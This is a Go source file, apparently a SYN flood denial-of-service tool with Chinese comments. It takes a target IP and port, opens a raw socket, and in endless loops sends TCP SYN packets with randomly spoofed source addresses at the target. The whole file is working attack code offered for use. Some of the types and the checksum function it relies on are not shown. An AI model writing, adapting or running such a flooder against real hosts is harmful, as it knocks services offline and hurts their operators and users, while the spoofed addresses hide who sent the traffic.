package main

import (
	"bytes"
	"encoding/binary"
	"flag"
	"fmt"
	"math/rand"
	"net"
	"os"
	"syscall"
	"time"
)

func main() {
	host := flag.String("h", "", "攻击目标IP")
	port := flag.Int("p", 0, "攻击目标端口")
	flag.Parse()

	if *host == "" {
		fmt.Println("参数 h 不能为空")
		return
	}

	if *port == 0 {
		fmt.Println("参数 p 不能为空")
		return
	}

	ipv4Addr := net.ParseIP(*host).To4()
	//目前没有实现ipv6
	if ipv4Addr == nil {
		fmt.Println("参数 h 不是有效的IPv4地址")
		return
	}

	handle(ipv4Addr, *port)
}

func handle(ip net.IP, port int) {
	//创建原始套接字
	fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
	if err != nil {
		fmt.Println(err)
		return
	}

	//设置IP层信息，使其能够修改IP层数据
	err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
	if err != nil {
		fmt.Println(err)
		return
	}

	//底层的fd转成文件对象
	file := os.NewFile(uintptr(fd), "socket")

	//文件对象转成go socket对象
	rawSocket, err := net.FileConn(file)
	if err != nil {
		fmt.Println(err)
		return
	}

	for i := 0; i < 2; i++ {
		go func() {
			var b bytes.Buffer
			for {
				ipv4Byte, _ := getIPV4Header(ip)
				tcpByte, _ := getTcpHeader(port)

				b.Write(ipv4Byte)
				b.Write(tcpByte)
				fmt.Println(rawSocket.Write(b.Bytes()))
			}
		}()
	}

	c := make(chan int, 1)
	<-c
}

func getIPV4Header(dstIP net.IP) ([]byte, error) {
	rand.Seed(time.Now().UnixNano())
	srcIP := net.IP(make([]byte, 4))
	binary.BigEndian.PutUint32(srcIP[0:4], uint32(rand.Intn(1<<32-1)))

	h := &ipv4Header{
		ID:       1,
		TTL:      255,
		Protocol: syscall.IPPROTO_TCP,
		Checksum: 0,
		Src:      srcIP,
		Dst:      dstIP,
	}

	b, _ := h.Marshal()
	h.Checksum = int(crc16(b))

	return h.Marshal()
}

func getTcpHeader(dstPort int) ([]byte, error) {
	rand.Seed(time.Now().UnixNano())

	h := &tcpHeader{
		Src:  rand.Intn(1<<16-1)%16383 + 49152,
		Dst:  dstPort,
		Seq:  rand.Intn(1<<32 - 1),
		Ack:  0,
		Flag: 0x02,
		Win:  2048,
		Urp:  0,
	}

	b, _ := h.Marshal()

	h.Sum = int(crc16(b))

	return h.Marshal()
}
